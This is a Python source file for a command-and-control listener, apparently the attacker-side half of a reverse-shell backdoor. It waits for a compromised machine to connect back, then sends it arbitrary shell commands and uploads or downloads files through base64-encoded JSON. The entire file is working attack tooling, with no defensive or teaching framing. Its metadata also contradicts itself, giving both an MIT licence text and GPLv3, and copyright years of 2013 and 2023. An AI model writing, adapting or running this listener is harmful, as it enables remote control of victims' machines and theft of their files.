#!/usr/bin/env python

import argparse
import socket
import json
import base64

"""
    To run the listener, pass the arguments as shown below:
    
    Usage:
      ./python listener.py -i '192.168.100.210' -p 4444
    
    License:
        MIT License

        Copyright (c) 2023 Marco A. Villarruel

        Permission is hereby granted, free of charge, to any person obtaining a copy
        of this software and associated documentation files (the "Software"), to deal
        in the Software without restriction, including without limitation the rights
        to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
        copies of the Software, and to permit persons to whom the Software is
        furnished to do so, subject to the following conditions:

        The above copyright notice and this permission notice shall be included in all
        copies or substantial portions of the Software.

        THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
        IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
        FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
        AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
        LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
        OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
        SOFTWARE.
"""

__author__      = "Marco A. Villarruel"
__authors__     = ["Marco A. Villarruel"]
__contact__     = "marco.urquieta@proton.me"
__copyright__   = "Copyright 2013, WildBerry"
__credits__     = ["Marco A. Villarruel"]
__date__        = "2023/06/15"
__deprecated__  = False
__email__       =  "marco.urquieta@proton.me"
__license__     = "GPLv3"
__maintainer__  = "developer"
__status__      = "Production"
__version__     = "1.0.0"

def logo():
    print("""
        ___    __    __   __  ____  ____  ___   __   _
       / __)  /__\  (  \_/  )(  _ \( ___)/ _ \ (  \_( )
      ( (__  /(__)\ )  ___  ( )___/ )__)( (_) )) (\ ) (
       \___)(__)(__)(__) (__)(__)  (____)\___/ (_) \__)
 _    _  _____  _     ____   _____  ____  _____  _____  _   _
( )  ( )(__ __)( )   (  _ \ ( (_) \( ___)( (_) )( (_) )( )_( )  
) (/\) ( _( )_ ) (__ ) (_) ))  _  ( )__) ) (\ ( ) (\ (  \   /
(_/  \_)(_____)(____)(____/ (_(_)_/(____)(_) \_)(_) \_)  (_)
        """)

class Listener:
    def __init__(self, ip, port):
        # initialize socket
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # bind the socket to the given IP and port
        listener.bind((ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connections.')
        # accept incoming connections
        self.connection, self.address = listener.accept()
        print('[+] Got a connection from ' + str(self.address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode('utf-8'))

    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data += (self.connection.recv(1024)).decode('utf-8')
                return json.loads(json_data.encode('utf-8'))
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)

        if command[0] == 'exit':
            self.connection.close()
            exit()

        return self.reliable_receive()

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content.encode('utf-8')))
            return '[+] Download successful.'

    def run(self):
        while True:
            command = input('>> ').split(' ')
            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1])
                    command.append(file_content.decode('utf-8'))

                result = self.execute_remotely(command)

                if command[0] == 'download' and '[-] Error ' not in result:
                    result = self.write_file(command[1], result)
            except Exception as err:
                result = '[-] Error during command execution: ' + str(err)

            print(result)


if __name__ == "__main__":
    logo()
    parser = argparse.ArgumentParser(
        description='Listener command line parameters.')
    parser.add_argument('-i', '--ip', required=True,
                        help='IP address')
    parser.add_argument('-p', '--port', required=True,
                        type=int, help='Port number')

    args = parser.parse_args()

    my_listener = Listener(args.ip, args.port)
    my_listener.run()
